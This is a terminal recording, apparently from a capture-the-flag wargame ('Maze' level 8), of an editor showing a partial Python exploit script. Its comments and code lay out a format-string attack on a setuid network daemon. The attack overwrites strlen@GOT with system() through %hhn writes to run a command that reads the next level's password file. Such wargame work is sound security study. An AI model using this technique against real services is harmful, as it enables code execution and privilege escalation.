[43.590146, "o", "\u001b[1;1H\u001b[34m# Maze L8 exploit: format string in the maze8 network password daemon.\r\r\n#\u001b[m\u001b[2;2H\u001b[K\u001b[3;1H\u001b[34m# /maze/maze8 31337 forks a listener; each child recv's 0x1ff bytes into a\u001b[m\u001b[3;75H\u001b[K\u001b[4;1H\u001b[34m# stack buffer, then calls snprintf(errbuf, 0x200, INPUT) -- the INPUT is the\r\r\n# FORMAT STRING (no 4th argument). After snprintf the child calls\r\r\n# strlen(errbuf), and strlen@GOT (0x0804b288) is writable (partial RELRO).\r\r\n# Overwrite strlen@GOT with system@libc (ASLR off: libc base 0xf7d6d000 +\r\r\n# system offset 0x53ce0) so strlen(errbuf) = system(errbuf), and errbuf starts\r\r\n# with our command (the literal text is printed first, so its first line IS\r\r\n# the command) -> runs as euid maze9 via the child's setreuid(euid, euid).\r\r\n#\r\r\n# Write mechanics: 4x %hhn writes the 4 bytes of system()'s address one byte\r\r\n# per write. The printed-char counts are mod-256 deltas, SORTED by (byte -\r\r\n# running_total) % 256, and the running total must include the literal text.\r\r\n# Vararg mapping measured with a marker scan: argument N addresses\r\r\n# buf + 4N - 536, so a pointer placed at buf offset o is vararg N = 134 + o/4.\r\r\n# snprintf's %n counts are VIRTUAL (past the 512-byte truncation), and the\r\r\n# payload cap is 511 bytes (the recv size).\u001b[m\r\r\n\u001b[35mimport\u001b[m socket, subprocess, time, struct, sys\r\r\nGOT_STRLEN = \u001b[31m0x0804b288\u001b[m\r\r\nSYSTEM = \u001b[31m0xf7d6d000\u001b[m + \u001b[31m0x53ce0\u001b[m\u001b[8C\u001b[34m# libc base (ASLR off) + system offset\u001b[m\r\r\nCMD = \u001b[31mb\"\u001b[m\u001b[35m\\n\u001b[m\u001b[31mcat /etc/maze_pass/maze9 > /tmp/o9 2>&1;\u001b[m\u001b[35m\\n\u001b[m\u001b[31m\"\u001b[m\r\r\n\u001b[33mdef\u001b[m \u001b[36mbuild_payload\u001b[m(target):\r\r\n    b = [(target >> (\u001b[31m8\u001b[m*i)) & \u001b[31m0xff\u001b[m \u001b[33mfor\u001b[m i \u001b[33min\u001b[m \u001b[36mrange\u001b[m(\u001b[31m4\u001b[m)]\r\r\n    cur = \u001b[36mlen\u001b[m(CMD)\u001b[19C\u001b[34m# the printed-char total includes the text\u001b[m\r\r\n    seq = []\r\r\n    remaining = \u001b[36mlist\u001b[m(\u001b[36menumerate\u001b[m(b))\r\r\n    \u001b[33mwhile\u001b[m remaining:\u001b[29;9Hbest = \u001b[36mmin\u001b[m(remaining, key=\u001b[33mlambda\u001b[m w: (w[\u001b[31m1\u001b[m]-cur) % \u001b[31m256\u001b[m)\u001b[30;9Hseq.append((best[\u001b[31m1\u001b[m], GOT_STRLEN+best["]
[43.607388, "o", "\u001b[31m0\u001b[m], (best[\u001b[31m1\u001b[m]-cur) % \u001b[31m256\u001b[m))\u001b[31;9Hcur = best[\u001b[31m1\u001b[m]\u001b[32;9Hremaining.remove(best)\r\r\n    fmt = CMD\u001b[34;83H1,1\u001b[11CTop\u001b[1;1H\u001b[?25h\u001b[?4m"]
